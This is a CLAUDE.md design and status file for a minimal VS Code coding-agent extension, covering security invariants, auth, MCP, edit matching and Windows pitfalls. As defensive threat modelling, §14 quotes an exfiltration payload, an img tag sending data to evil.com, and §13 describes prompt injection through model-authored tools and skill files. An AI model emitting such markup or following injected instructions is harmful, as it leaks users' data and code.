# CLAUDE.md — Light Code

This file is the durable context for every Claude Code session in this repo. Read it
first. If a decision here conflicts with something you are about to do, this file wins —
raise the conflict with the user rather than working around it.

Keep this file current. When a phase completes or a decision changes, update the relevant
section in the same commit.

---

## 1. What Light Code is

An open-source VS Code extension: a minimal agentic coding assistant. It provides a chat
UI, a small set of built-in agent tools, configurable LLM providers, MCP tool integration,
and image attachments — and deliberately nothing else.

It is built **greenfield**, using the archived [Roo Code](https://github.com/RooCodeInc/Roo-Code)
repository (Apache-2.0, archived 2026-05-15, final release v3.54.0) as a **frozen
reference**. We borrow proven formats and patterns from it. We do not fork it, and we do
not copy code verbatim without attribution. For anything Roo did poorly, check Cline or
Kilo Code, which are actively maintained.

Primary deployment context: **inside an organisation**, against an internal LLM gateway
and internal MCP servers. This drives several design decisions that would otherwise look
over-cautious.

License: MIT. No telemetry, ever.

### Current focus

The **VS Code extension** is the product. A Node-host/browser version is planned later and
is the reason for several architectural constraints below, but no work on it happens until
the extension ships. See §14.

---

## 2. Repository layout

```
packages/core      Agent loop, tools, providers, auth, MCP client, config, secrets.
                   Platform-agnostic. MUST NOT import `vscode`.
packages/ui        React chat + settings UI. Talks over a Transport interface.
                   MUST NOT import VS Code webview APIs directly.
apps/vscode        Thin host: activation, SecretStorage, terminal, webview plumbing.
apps/host          (DEFERRED) Node server + browser UI. Do not create yet.
```

pnpm workspaces. No Turborepo — the repo is too small to justify it.

---

## 3. Hard invariants

These are non-negotiable. The first two are enforced by ESLint; breaking them fails CI.

1. **`packages/core` never imports `vscode`.** Enforced by `no-restricted-imports`.
2. **All outbound network traffic goes through the single `HttpClient` in core.**
   `fetch`, `axios`, `undici`, and `node:http`/`node:https` are banned everywhere else.
   Enforced by `no-restricted-imports`.
3. **No default endpoints.** A fresh install contacts nothing. Every URL is user-supplied.
4. **No telemetry, no update checks, no remote assets.** All webview assets are bundled
   locally. CI fails if built output contains an absolute external URL.
5. **These config keys are user-scope only and are ignored if found in workspace config:**
   the entire `profiles` list, `activeProfileId`, `certDir`, `python.uvPath`.
   A hostile repo must not be able to repoint credentials or executables — this means a
   workspace can't inject a whole new profile (its own `baseUrl`/`auth`/`model`) any more
   than it could edit an existing one, and can't switch which profile is active. (Originally
   worded as `provider.baseUrl` + "everything under `auth`" for a single active profile;
   broadened to the whole list once named profiles — §9 — made that shape a list of
   profiles rather than one singleton.)
6. **Cert/key files must live outside the workspace root**, and their resolved paths are on
   a hard deny list for every file-reading tool.
7. **Secrets never cross the bridge toward the UI.** Write-only. No `getSecret` message
   type exists.
8. **Approval UI shows ground truth** — the literal command, the computed diff, the actual
   source — never the model's description of what it intends to do.

### The security boundary, stated precisely

> Light Code makes no network connection the user has not configured. It ships with zero
> default endpoints, no telemetry, no update checks, and no remote assets. The only hosts
> it contacts are the model gateway and MCP servers named in config. Code that Light Code
> executes on the user's instruction — shell commands, Python tools, MCP servers — is
> outside this boundary and governed by the user's environment.

We do **not** sandbox executed code, and we do not protect against another process running
as the same user. Say so plainly in the README. Do not overclaim.

Two things sit awkwardly on this line and are treated as *ours* to handle: package-runner
MCP commands (`npx -y ...`) and `uv` resolving PyPI. Both fetch from the internet on
machinery Light Code chose. Warn on the first; make the second use a configured index or
run offline.

---

## 4. Platform interfaces

Everything platform-specific lives behind an interface in core. There is one
implementation of each in v1. That is the point — the second host becomes a port, not a
rewrite.

- `FileSystem` — read, write, stat, list. Plain string paths.
- `Terminal` — run a command, stream output, kill a process tree.
- `SecretStore` — async get/set/delete; reports which backend is active.
- `Config` — load/save/watch scoped JSON config.
- `Transport` — bidirectional message passing between host and UI.
- `HttpClient` — the sole network egress point.

**Paths are plain strings in core.** `vscode.Uri` conversion happens only at the host
boundary. This one leaks more easily than the others; watch for it in review.

---

## 5. Agent loop

Autonomous multi-step, modelled on Roo:

- One tool call per assistant message.
- User approval between steps (subject to auto-approve settings).
- Loop continues until the model calls `attempt_completion`.
- Hard iteration cap (default 25, configurable) with a clear message on hit.
- Tool results are fed back as the next user turn.

---

## 6. Tools

Nine in v1:

| Tool | Group | Notes |
|---|---|---|
| `read_file` | read | Line-numbered output; supports offset/limit ranges |
| `list_files` | read | ripgrep-backed; recursive optional; ignores `node_modules`, `.git` |
| `search_files` | read | ripgrep regex with context lines |
| `write_to_file` | edit | Full content. Approval shows a computed diff |
| `apply_diff` | edit | See §7. The primary edit path |
| `execute_command` | command | VS Code integrated terminal with shell integration |
| `use_mcp_tool` | mcp | Namespaced; see §11 |
| `ask_followup_question` | always | Control tool |
| `attempt_completion` | always | Control tool; terminates the loop |

**Explicitly not in v1:** browser automation, semantic/embedding codebase search,
`insert_content`, `list_code_definition_names`, mode-switching and subtask tools, a fetch
tool.

Constraint: **the model must have read a file in the current session before editing it.**
Cheap invariant, eliminates a class of hallucinated edits.

---

## 7. Edit strategy — `apply_diff`

This is the highest-consequence part of the codebase. Read this section fully before
touching it.

### Format

Roo's marker format, which models are heavily trained on:

```
<<<<<<< SEARCH
:start_line:42
-------
  throw new Error("no user")
=======
  throw new UnauthorizedError("no user")
>>>>>>> REPLACE
```

- Multiple blocks per call, for one file.
- `:start_line:` is a **hint** used to prioritise search order, not a requirement.
- **All blocks are validated before any write.** Partial application is forbidden.
- Reject `:start_line:` or other markers appearing after the `=======` separator — this is
  a real failure mode observed in Roo with some models.

### Matching cascade — deterministic, in order

1. **Exact match** after normalising line endings to `\n`.
2. **Whitespace-insensitive**: compare with leading/trailing whitespace stripped per line;
   apply using the file's real indentation.
3. **Anchor match** (blocks of 5+ lines only): match first and last lines, verify the
   interior is consistent.
4. **Fail** — return the failure plus the actual current text around the hinted region so
   the model can retry with correct context.

**There is no similarity threshold and no Levenshtein scoring.** This is a deliberate
divergence from Roo, whose fuzzy matcher produced both false rejections (99% similar,
needed 100%) and the risk of silent misapplication. A rejected edit costs a retry; a
misapplied edit costs data.

**Do not add fuzzy matching later without an explicit decision from the user.**

### Other rules

- **Uniqueness required.** If SEARCH text matches in more than one place, reject and ask
  for more context. Never "apply to the first occurrence."
- **Line endings:** detect the file's dominant EOL on read, normalise to `\n` for all
  model-facing content, restore the original on write. Without this, every edit to a CRLF
  file fails. This is not optional on Windows.
- **Normalisation is limited to line endings and trailing whitespace.** Do not decode HTML
  entities or apply any other transformation to the SEARCH block — Roo had a bug here.
- **Consecutive-mistake tracking** per file: after N failed attempts on the same file
  (default 3), stop and surface it rather than letting the model loop.

---

## 8. Approval, checkpoints, modes

### Approval

- Per-invocation by default. **All auto-approve toggles ship off.**
- Granular auto-approve by category: read / edit / command / mcp.
- Command allowlist for `execute_command` auto-approve — **not available on Windows in
  v1.** PowerShell chaining and quoting are too easy to get wrong, and a broken allowlist
  is worse than none.
- "Always allow" scopes to a specific tool in a specific workspace. Never global.
- Approval UI renders ground truth (invariant 8).

### Checkpoints

Shadow-git snapshot before the first edit of a task, allowing rollback. Borrowed from Roo.
Cheap insurance, and it pairs well with the strict-matching decision.

### Modes and tool groups

Tools belong to groups (`read`, `edit`, `command`, `mcp`, `always`). A mode includes or
excludes groups.

- **Code** — all groups.
- **Ask** — `read`, `mcp`, `always`. This *is* the read-only mode; it is not a separate flag.

This mechanism doubles as the tool-profile system for context budgeting (§12). Custom
user-defined modes are deferred.

---

## 9. Providers

Three wire adapters, one interface:

- **OpenAI-compatible** — ships first. DeepSeek is a preset over this (base URL + label).
- **Anthropic Messages** — phase 7.
- **Gemini `generateContent`** — phase 7.

Presets prefill base URL and wire format. **Every field remains user-editable.** No
hardcoded endpoints anywhere (invariant 3).

**Named profiles.** Users have several — e.g. the corporate gateway and a local dev model —
switchable without retyping. Borrowed from Roo's API configuration profiles.

### Model selection

Dropdown populated from the provider's models endpoint (`/v1/models`, `/v1beta/models`),
with **free-text entry always available** and a manual refresh. Gateways frequently return
their own catalogue or 404 — never make the dropdown a hard dependency.

Ship a local metadata table keyed by model ID for **context window, vision support, and
tool-use support**, since models endpoints do not reliably report these. Per-profile
overrides in the UI. Unknown IDs (likely with gateway aliases) default conservatively.

---

## 10. Auth

Auth is a **separate pluggable axis from wire format**, so any strategy composes with any
adapter.

```
Provider = { wireFormat, baseUrl, auth, model, headers? }
Auth     = { type: "apiKey" | "apigeeMtls" | "none", ... }
```

### Simple config (UI default)

Preset, base URL, API key, model.

### Advanced config — `apigeeMtls`

**Replaces** the API key rather than supplementing it. Never both live at once.

Flow: mTLS handshake to the token endpoint → `client_credentials` grant → `access_token`
+ `expires_in` → attached to inference requests.

Implementation requirements:

- **Proactive refresh:** refresh at `issuedAt + expiresIn - skew` (default 60s). Never wait
  for a 401 — it stalls mid-stream.
- **Single-flight:** concurrent requests share one in-flight refresh promise.
- **One 401 retry:** force-refresh, retry once, then a clear error. Never loop.
- **Streaming:** validate token lifetime before opening a stream, with margin for a long
  generation.
- **Token in memory only.** Never on disk, never in logs, redacted in the audit log.

All of these are configurable in Advanced with working defaults:
`tokenUrl` (default: baseUrl origin + `/oauth/token`), `grantType`, `clientId`,
`clientSecretRef`, `scope`, `extraTokenParams`, `tokenHeaderName` (default
`Authorization`), `tokenHeaderPrefix` (default `Bearer `), `tokenPath`, `expiresInPath`,
`fallbackExpirySeconds` (default 3600 — some gateways omit expiry entirely),
`refreshSkewSeconds`, `extraHeaders`.

### Certificates

User specifies a **directory** plus filenames; filenames resolve against it, absolute paths
override it. Defaults `client.crt` / `client.key`. Support `pfx` as an alternative — corporate
Windows PKI usually issues `.pfx`. Passphrase is a `SecretStorage` ref, never a literal.

- Validate **at config time**: files exist, parse, key matches cert, and report `notAfter`.
- Warn at 30 and 7 days before expiry.
- Watch cert files; on change rebuild the TLS agent and drop the cached token.
- Handshake errors must name the file and the reason (expired / key mismatch / CA
  untrusted). Never surface raw OpenSSL codes.
- `certDir` must be outside the workspace and on the tool deny list (invariants 5, 6).
- Support `NODE_EXTRA_CA_CERTS` and a configurable `ca` path — corporate TLS interception
  will otherwise break the one legitimate connection.

### Test Connection

A button in Advanced that runs load-certs → get-token → list-models and reports **which
step failed**. This is the highest-value piece of UI in the settings panel; it converts a
class of opaque TLS and OAuth failures into a one-click diagnosis.

---

## 11. MCP

Client runs **host-side** (extension host; later the Node main process) — it spawns
processes and opens sockets, so it can never run in the webview.

- SDK: `@modelcontextprotocol/sdk`. Do not hand-roll JSON-RPC.
- Transports: **stdio** (common case) and **Streamable HTTP**. Check current SDK/spec
  status before implementing — this area moves quickly. SSE is superseded but still
  deployed in the wild.
- Config uses the standard `mcpServers` shape so users can paste configs from other
  clients unchanged.
- Global and workspace scopes; workspace wins.
- **Namespace every tool** (`filesystem__read_file`). Collisions across servers are
  inevitable.
- Per-server and per-tool enable toggles **from the start** — a single server can expose
  forty tools and they all land in the system prompt.
- Lazy connect on first use; health status in the UI; restart on crash; handle
  `tools/list_changed`.
- Secrets interpolated from `SecretStorage`/env, never written into the config file.
- **Schema translation per provider** is a common source of silent tool-call failures.
  MCP gives JSON Schema; Anthropic wants `input_schema`, OpenAI nests under
  `function.parameters`, and providers differ on tolerated keywords.

**Deferred:** resources, prompts, and **sampling** (a real security surface — do not
implement without an explicit decision).

---

## 12. Context management

Three things compete for the window, and they scale very differently. Results dominate.

- **Prompt caching inverts the obvious answer.** Tool definitions sit at the front of the
  prompt. Swapping them per turn to "save context" invalidates the cache prefix *and all
  history after it*, costing more than sending everything. **The static prefix must be
  stable within a session.** Selection happens at mode/session boundaries only.
- **Result truncation with a re-read handle** — the single biggest lever, and the one thing
  that must exist in v1 because retrofitting changes every tool's return path. Cap results
  (~2k tokens), store full output on disk, return a reference the model can re-read with an
  offset.
- **Drop superseded results** — if a file was read three times, only the latest matters.
- **History compaction** past a threshold: summarise oldest turns, keep the last N verbatim.
  Never compact mid-tool-call. Preserve file paths, commands run, and decisions made.
- **Modes are the tool-profile mechanism** (§8). Do not build a separate one.
- **Instrument it:** per-request token breakdown (system / tool defs / history / results)
  plus cache hit rate, surfaced in the UI.

Semantic retrieval over tool descriptions is **out** — silent misses, embedding dependency,
and turn-1 queries don't predict step-7 needs.

---

## 13. Python interop and skills (phase 9)

Two distinct mechanisms. **Do not share an implementation** — a skill is text injected into
context; a tool is code that executes. Same discovery patterns, completely different trust
models.

### Dynamic tools

The model can create, update, and delete Python tools during a chat.

- One file per tool. Entry point named `run`. Tool name from filename.
- **File is the source of truth.** Dependencies in a PEP 723 inline block (uv reads it
  natively). Schema derived from type hints via `pydantic.TypeAdapter(run).json_schema()`;
  description from the module docstring; parameter docs from Google-style `Args:`.
  Never hand-maintain metadata — it drifts within a week.
- `.registry.json` is a **generated cache** keyed by content hash. Gitignored. Never
  hand-edited.
- **Persistent worker process** per workspace, JSON-RPC over stdio, `importlib.reload` on
  change, per-call timeout, kill-and-restart on hang. This implies a **single shared venv**,
  so cross-tool dependency conflicts are possible — a documented, accepted tradeoff.
- **Validate before registering:** `ast.parse`, import, generate schema. On failure return
  the traceback to the model to fix.
- Registered as a third tool provider alongside built-ins and MCP, reusing the same
  registry, namespacing (`py__*`), and approval.

### Security — this is the sharpest surface in the project

Everything else gates *calling* a tool. This makes the **body** model-authored, so an
injected instruction can create a persistent, later-auto-approved code path.

- **Create/update requires approval showing full source diff.** Ground truth.
- **Content hash pinned** in the registry; refuse to load on unapproved change.
- **Tools directory defaults inside the workspace** (`.lightcode/tools/`) so changes land
  in git and get code-reviewed. This is a real mitigation.
- **Never pass provider API keys into the Python environment.** Minimal inherited env.
- `uvPath`, `toolsDir`, `venvPath` are user-scope only (invariant 5).
- Network egress from tool code is uncontrollable without a real sandbox. Document it.
- **Opt-in by default**, with `dynamicTools: "off"` supported.

### Skills

Markdown with frontmatter (`name`, `description`).

- **Only `name` + `description` go in the system prompt.** Bodies are read on demand via
  the existing `read_file` — no dedicated `load_skill` tool needed. This keeps baseline
  cost at a few tokens each and lets skills reference other files and grow arbitrarily.
- A skill file is a **persistent prompt-injection vector** — prose nobody code-reviews.
  Writes go through approval; plain markdown in git is the main defence.

---

## 14. Deferred: Node host and browser UI

Not started until the extension ships. Fully specified here so it isn't redesigned.

`npx light-code` starts a local Node server and opens the system browser. Same core, same
`packages/ui`, served over HTTP rather than loaded into a webview.

**A localhost server that reads files and spawns shells is a genuine attack surface** — any
page the user has open can send requests to `127.0.0.1`. Required, not optional:

- Bind literal `127.0.0.1` (not `localhost` — resolution varies and can dual-stack), port `0`.
- **Two-stage token handoff**: launch URL carries a single-use ~10s handoff token in the
  fragment; page POSTs it to `/api/session` for a session token; page calls
  `history.replaceState` to strip the fragment. Long-lived tokens must never be in a URL.
- **Bearer header, not a cookie.** Cookies are attached automatically, which is exactly
  what CSRF exploits.
- **Validate `Origin`** (CSRF) **and `Host`** (DNS rebinding) on every request. Rebinding
  passes the Origin check — the Host header is what catches it.
- **WebSockets are not subject to CORS.** Reject foreign origins in the upgrade handler
  manually. Token via `Sec-WebSocket-Protocol` or a mandatory first message with a 2s
  timeout.
- **Strict CSP**: `default-src 'none'; script-src 'self'; img-src 'self' data:;
  connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'`.
  The `img-src` and `connect-src` restrictions block the classic exfiltration trick where
  model output contains `<img src="https://evil.com/?d=...">`.
- Sanitize markdown rendering (DOMPurify, no raw HTML, `rel="noopener noreferrer"`).

Also needed: a non-`SecretStorage` backend (DPAPI via native module on Windows, `security`
on macOS, libsecret on Linux, restricted-permission file as fallback) — which is why
`SecretStore` is async and reports its backend.

Electron only if the browser version proves insufficient. `npm` distribution of native
binaries, if ever needed, uses the platform-specific `optionalDependencies` pattern
(as esbuild and swc do). RPM/deb/AppImage are electron-builder CI targets, not a decision
to make now.

---

## 15. Config and secrets

### Config

**Core owns the config file, not VS Code.** One JSON file per scope, read/written through
the `Config` interface. The host supplies the path (`globalStorageUri` for user scope,
`.lightcode/config.json` for workspace). The settings UI is a front-end over that file, so
the Node host later gets the same UI for free.

Expose only a couple of things in VS Code's own settings (config path override, log level)
so the extension still feels native.

- **One schema** (zod) used by both the UI and the file loader, so a hand-edited file and a
  UI save fail identically. Field-level errors inline.
- **Scope is visible in the UI.** User-scope-only fields (invariant 5) must not offer a
  workspace toggle, and if found in workspace config, show an "ignored (user-scope only)"
  badge rather than dropping them silently.
- **Live reload** — watch the file so hand-edits and UI edits behave the same.
- **Import/export** with secrets stripped and cert paths preserved. Colleagues will want to
  share a working gateway config.

### Secrets

Secrets are: provider API keys, Apigee `client_secret`, cert passphrases, MCP server env
values, and issued OAuth tokens. **Not** secrets: base URLs, cert *paths*, model names,
`uvPath`.

- **VS Code:** `SecretStorage` (DPAPI/Keychain/libsecret). Config holds **references** only:
  `{ "apiKeyRef": "profile:gateway:apiKey" }`. Namespace keys so deleting a profile
  reliably deletes its secrets — orphans otherwise accumulate invisibly.
- **Write-only across the bridge** (invariant 7). UI renders "Set — replace?", never a
  masked value round-tripped from the host.
- **Never in the config file, never in exports, never in logs.** A single redaction helper
  applied to all logging and error paths, keyed on known secret values plus patterns for
  `Bearer` tokens and `sk-`-style keys. HTTP libraries love to echo request headers.
- **Fetch at request time**, cache within a request, drop after. Failure to resolve a ref
  produces "credential missing for profile X — reconfigure", not an unauthenticated request.
- **Never in the Python or MCP environment** unless that server was explicitly configured
  to receive one.
- Deletion is real. Provide "clear all stored secrets".
- The UI states which backend is active. Do not imply keychain-grade protection when it's a
  file.

### Audit log

Append-only: every tool execution (timestamp, tool, arguments, approved/auto) and every
token acquisition (timestamp, endpoint, success, expiry — **never the token**). Cheap to
build, invaluable for trust, debugging, and enterprise review.

---

## 16. Windows

Primary development platform. These are silent-failure sources, not preferences.

- **Line endings** — see §7. `.gitattributes` with `* text=auto eol=lf`;
  `core.autocrlf=input`.
- **Path confinement** must resolve symlinks *and* compare case-insensitively:
  ```js
  const real = await fs.realpath(requested)
  const norm = s => process.platform === 'win32'
    ? path.resolve(s).toLowerCase() : path.resolve(s)
  if (!norm(real).startsWith(norm(root) + path.sep)) throw new Error('outside workspace')
  ```
  Prefix-matching the *unresolved* path is the classic bug. Also handle drive-relative
  paths (`C:foo`), UNC, `\\?\` prefixes, and 8.3 short names.
- **Spawning `.cmd`/`.bat`** — `uv`, `npx`, `pnpm` are shims on Windows. Node requires
  `shell: true`, which reintroduces argument-injection risk. Resolve to the real `.exe`
  where possible; keep a hardcoded allowlist of spawnable shims; **never interpolate
  model-supplied strings into a shell-spawned command line.**
- **Process termination** — `child.kill()` does not kill grandchildren. Use
  `taskkill /PID <pid> /T /F` or a Job Object. Without this you leak orphaned processes
  constantly.
- **Shell** — `pwsh` if present, else `cmd`, configurable. PowerShell 5.1 does not support
  `&&`; PowerShell has its own chaining and subexpression syntax. Hence no command
  auto-approve on Windows in v1.
- **venv layout** — `.venv\Scripts\python.exe`, not `bin/python`. Behind a helper from day one.
- **Config paths** — `%APPDATA%\light-code\`. Use `env-paths`, don't hand-roll.
- Long paths and Developer Mode enabled; Defender exclusions for the repo and pnpm store.

---

## 17. Conventions

- TypeScript strict. No `any` without a comment justifying it.
- Vitest. ESLint flat config + Prettier. Changesets for versioning.
- esbuild for the extension bundle.
- Conventional commits.
- **Errors are for humans.** Every user-facing error names what failed, which file or host
  was involved, and what to do next.
- Prefer fewer, more general tools over many narrow ones — it directly reduces context cost
  and improves selection accuracy.
- New platform-specific behaviour goes behind an interface (§4), not inline.

### Commands

```bash
pnpm install --ignore-scripts   # --ignore-scripts is deliberate; see invariant 4
pnpm build
pnpm test
pnpm lint
pnpm typecheck
pnpm package                    # produces .vsix
```

CI matrix includes `windows-latest` from the first commit, plus a network-isolated job
proving a full session works with no route to the internet.

---

## 18. Where we deliberately differ from Roo

Record the reason, not just the difference.

| Difference | Reason |
|---|---|
| Greenfield, not a fork | Roo is archived; no upstream fixes. Minimalism is the product. |
| Deterministic matching, no fuzzy threshold | Roo's Levenshtein matcher produced both false rejections and silent-misapply risk. |
| One wire adapter in v1 | Gateway fronting is the deployment; avoids auditing SDKs for hidden endpoints. |
| No shell auto-approve on Windows | PowerShell parsing is too easy to get wrong; a broken allowlist is worse than none. |
| No browser tool, no semantic search | Out of scope; embeddings conflict with the offline posture. |
| Dynamic Python tools + skills | New capability Roo did not have. |

---

## 19. Status

Update this section every session.

**Current phase:** Phase 2b complete — see `IMPLEMENTATION_PLAN.md`. Phase 3 not started.

**Phase 2b done:**
- Full multi-profile CRUD replaces the single-`'default'`-profile draft from Phase 2:
  `packages/ui/src/settings/` — `SettingsPanel.tsx` (tabbed shell, one tab so far),
  `ProvidersTab.tsx` (list, Use/Edit/Duplicate/Delete, Export/Import buttons),
  `ProviderForm.tsx` (preset dropdown + fields + inline field-level errors),
  `ScopeBadge.tsx`, `SecretField.tsx` (write-only "Set — Replace?").
  `packages/core/src/providers/presets.ts` (OpenAI/DeepSeek/Custom, prefilling
  base URL + wire format, all fields still editable per §9).
  `packages/core/src/config/validate.ts` derives field-level validation from
  `providerProfileSchema.pick(...)` — the exact same schema the file loader uses, so a
  bad UI save and a bad hand-edit fail identically. `baseUrl` now validates as a real
  URL (`.url()`), not just non-empty — a deliberate strengthening of invariant-adjacent
  validation, shared by both paths since it lives in the one schema.
- `bridge.ts` handles `requestProfiles`/`saveProfile`/`duplicateProfile`/
  `deleteProfile`/`setActiveProfile`/`exportConfig`/`importConfig`. Duplicate copies the
  actual secret value to a new `SecretStorage` key (not just the reference) so the copy
  works standalone; delete removes the profile's secret too, not just the config entry.
  Export/import go through `vscode.window.showSaveDialog`/`showOpenDialog` — config
  export is safe by construction, not by redaction: the file format only ever stores
  `apiKeyRef` pointers, never key values, so there's nothing to strip.
- Fresh-install CTA: `App.tsx` requests the profile list on mount (not just when
  Settings opens) and shows "No provider configured yet" instead of a blank chat when
  the list is empty.
- Verified per the phase's own Verify step: grepped `HostToUiMessage` — no variant
  carries a secret value, only `hasApiKey: boolean` per profile. The one `secrets.get()`
  call in the codebase (inside `duplicateProfile`, to copy the value) never reaches a
  `post()` call.
- 42 unit tests total (up from 36): presets and `validateProviderForm`.

**Surprised us in Phase 2b:**
- **The webview bundle broke** the moment `ProviderForm.tsx` imported a real value
  (`providerPresets`, `validateProviderForm`) from `@light-code/core` rather than only
  types. Type-only imports get erased by TypeScript, so they were free; a value import
  pulls in core's whole barrel file, which transitively reaches `node:fs`/`node:path`
  (via `ConfigManager`, `confine()`, `env-paths`, etc.) — and esbuild's tree-shaking
  through a multi-layer barrel wasn't reliable enough to strip those back out even
  with `"sideEffects": false` set. Fixed properly, not papered over: added
  `packages/core/src/browser.ts`, a second entry point (`@light-code/core/browser` via
  `package.json` `exports`) containing only what's genuinely safe for a browser bundle
  — protocol types, `Transport`, provider/preset types, `providerPresets`,
  `validateProviderForm`. **packages/ui must only ever import from `@light-code/core/browser`,
  never the bare package** — if a future value export needs to reach the UI, it goes
  through this file deliberately, not by accident. Worth remembering before Phase 3
  adds more shared value-level exports (tool result types, etc.) that `packages/ui`
  might want to import.
- A live DeepSeek response claiming "I'm a chat model" while `deepseek-reasoner` was
  correctly selected (confirmed via the request log AND the presence of
  `reasoning_content` deltas, which only the reasoner model emits) turned out to be the
  model being wrong about its own identity — not a profile-routing bug. Worth
  remembering as a category: LLMs are unreliable narrators of which model/version they
  are, and that alone isn't evidence of a client-side bug. `reasoning_content` deltas
  are correctly ignored (not displayed) by the current adapter — showing a reasoning
  trace in the UI is a future enhancement, not a gap.

**Phase 2 done, plus deliberate scope changes from the plan as written:**
- `packages/core/src/providers/`: `types.ts` (zod schemas + inferred types for
  `WireFormat`, `Auth`, `ProviderProfile`, plus `ChatMessage`/`StreamChunk`/`ChatProvider`),
  `openai.ts` (SSE-streaming OpenAI-compatible adapter over `HttpClient`), `registry.ts`
  (`resolveActiveProfile`), `auth/apiKey.ts` (`apiKey`/`none` strategies). `agent/`:
  `messages.ts` (`Conversation`), `loop.ts` (`runAgentTurn` — minimal, no tools),
  `protocol.ts` (`UiToHostMessage`/`HostToUiMessage`, shared by ui and vscode).
- **Config schema changed from Phase 1's assumption.** Invariant 5 originally named
  `provider.baseUrl` + `auth` (a single active profile). Implementing named profiles
  (§9) properly required `profiles: ProviderProfile[]` + `activeProfileId`, and the
  right security boundary is the **whole list** being user-scope-only — a workspace
  injecting a brand-new profile is exactly invariant 5's threat, not just editing an
  existing one's `baseUrl`/`auth`. Invariant 5's wording was updated to match, in the
  same commit as the schema change. `USER_SCOPE_ONLY_KEYS` is now
  `['profiles', 'activeProfileId', 'certDir', 'python.uvPath']`.
- **The webview is a sidebar `WebviewView` (Activity Bar icon), not a command-opened
  `WebviewPanel`** — changed from the original plan based on direct user feedback
  mid-phase. `apps/vscode/src/webview/chatViewProvider.ts` replaces the old `panel.ts`;
  `contributes.viewsContainers`/`views` in `apps/vscode/package.json`. `bridge.ts` now
  takes a plain `vscode.Webview`, not a `WebviewPanel`, so it works for either host.
- **A minimal single-profile settings screen was pulled forward from Phase 2b**, also
  from mid-phase user feedback (nobody should have to use `showInputBox` prompts to
  configure a provider). `packages/ui/src/Settings.tsx` + a gear-icon toggle in
  `App.tsx`; host side handled `requestProfile`/`saveProfile` in `bridge.ts` against a
  single hardcoded `'default'` profile ID. **Fully replaced by the real Phase 2b work
  below** — `Settings.tsx` no longer exists; see the Phase 2b entry.
- Icons: `apps/vscode/resources/` holds real brand assets (activity-bar-icon.svg,
  icon-256.png for the marketplace listing, etc.) supplied by the user, replacing the
  placeholder chat-bubble glyph from initial scaffolding. `packages/ui/src/icons.tsx`
  has small inline SVG icons (send/stop/back/settings) — no icon font/library, keeps
  the bundle small and the CSP unloosened.
- Styling uses VS Code's `--vscode-*` theme CSS variables (`packages/ui/src/theme.ts`)
  exclusively, via React's `style` prop (CSSOM property assignment — not subject to
  `style-src` CSP at all, so the webview CSP stays `default-src 'none'` with no
  `style-src` exception needed). This is deliberate: it makes the UI track whatever
  theme the user has active rather than a fixed palette.
- 36 unit tests total (up from 18): SSE parsing (split-chunk buffering, malformed
  frames, HTTP errors, network errors, clean abort), auth strategies, profile
  resolution, and the agent loop (including the two bugs below).
- Manual end-to-end verification against a real DeepSeek endpoint: streaming works,
  cancellation works, a deliberately-wrong base URL produces a readable error.

**Two real bugs found and fixed during manual testing (not caught by unit tests —
worth having caught in Phase 3+'s test strategy for the UI side):**
1. **Late-error text loss.** If a stream errored *after* sending some text (e.g. a
   connection drop near the end of a long response), both `runAgentTurn` and the UI
   discarded everything already received instead of keeping it. Fixed in both places:
   `runAgentTurn` now calls `conversation.addAssistantMessage` before `onError` if any
   text arrived; the UI does the equivalent for its own state.
2. **The actual root cause of "response streams in, then vanishes to an empty bubble":**
   `App.tsx` kept the in-progress assistant reply in *separate* state
   (`streamingText`/a ref) from the finalized `messages` array, manually handed off at
   the `done`/`error` boundary. This is exactly the shape of bug that's easy to get
   wrong and hard to fully rule out by inspection — fixed by removing the separate
   state entirely: the in-progress message now lives *inside* `messages` (a `pending`
   flag), updated in place. No hand-off moment means no seam for this class of bug to
   hide in. Also made `HostToUiMessage`'s `textChunk` carry the *full* accumulated
   text rather than a delta, since `webview.postMessage` delivery isn't guaranteed
   (confirmed via `Thenable<boolean>` — false means undelivered) and cumulative
   messages are self-correcting if one is ever dropped. `WebviewTransport` now logs a
   warning (via the `Light Code` Output channel) if delivery ever reports failure.
3. **Separately, a `Settings.tsx` race condition** looked like "the API key isn't
   persisting" but wasn't a persistence bug at all: `useState(props.baseUrl)` only
   applies its argument once, at mount. `openSettings()` fires `requestProfile` and
   switches views in the same synchronous call, so `Settings` can mount *before* the
   host's response arrives — whichever happens to win that race determined whether the
   fields showed real data or stayed empty forever after. Fixed with a `useEffect`
   that resyncs local state whenever the `baseUrl`/`model` props change. Confirmed via
   direct inspection (both the config file on disk and the encrypted secret in VS
   Code's `state.vscdb`) that the underlying data was correct the whole time — this
   was purely a rendering bug, and a good reminder not to trust "it looks unpersisted"
   reports at face value without checking storage directly.

**Phase 1 done:**
- All six platform interfaces defined in `packages/core/src/platform/`
  (`FileSystem`, `Terminal`, `SecretStore`, `ConfigStore`, `Transport`, `HttpClient`).
  `HttpClient` is the one with a real implementation in core (`FetchHttpClient`, using
  global `fetch`) — the other five are interfaces only, implemented in
  `apps/vscode/src/platform/` (`NodeFileSystem`, `NodeTerminal`, `VSCodeSecretStore`,
  `VSCodeConfigStore`, `WebviewTransport`). None have callers yet — that's expected
  until later phases build the tools/UI/auth that consume them.
- `packages/core/src/config/`: a zod schema modelling exactly the four user-scope-only
  fields named in invariant 5 (nothing else yet — no other config shape has been
  designed), `mergeScopes()` enforcing that list (workspace values for those keys are
  dropped and reported in `ignoredWorkspaceKeys`, never silently applied or silently
  dropped), and a `ConfigManager` tying schema + scopes + `ConfigStore` together for
  load/validate/save/watch.
- `packages/core/src/logging/`: `redact()` (known-secret values, `Bearer` tokens,
  `sk-`-style keys) and a `Logger` that always routes through it.
- `packages/core/src/fs/`: `confine()` (realpath + case-insensitive containment per
  §16, handles not-yet-existing paths for writes) and `PathDenylist` (invariant 6,
  compares resolved paths so a symlink can't launder a denied file under another name).
- 18 unit tests (`confine`, `denylist`, `scopes`, `redact`), all passing. The symlink
  test is `skipIf`-guarded and currently **skips on this dev machine** (no Developer
  Mode / symlink privilege) — it will actually run wherever that privilege exists,
  which should include CI's `windows-latest` job; worth confirming once CI runs for
  real rather than assuming.
- `SecretStore` round-trip through real `vscode.SecretStorage` and `ConfigStore`
  hot-reload against a real `globalStorageUri` were **not** independently verified —
  both need a real extension host and currently have no caller in `extension.ts`
  (Phase 1's own scope fence: "Not in this phase: Any UI. Any provider."). Verify
  these for real the first time something in Phase 2+ actually wires them in.

**Phase 0 done:**
- pnpm workspace scaffolded (`packages/core`, `packages/ui`, `apps/vscode`), all four
  commands (`build`, `test`, `lint`, `typecheck`) pass.
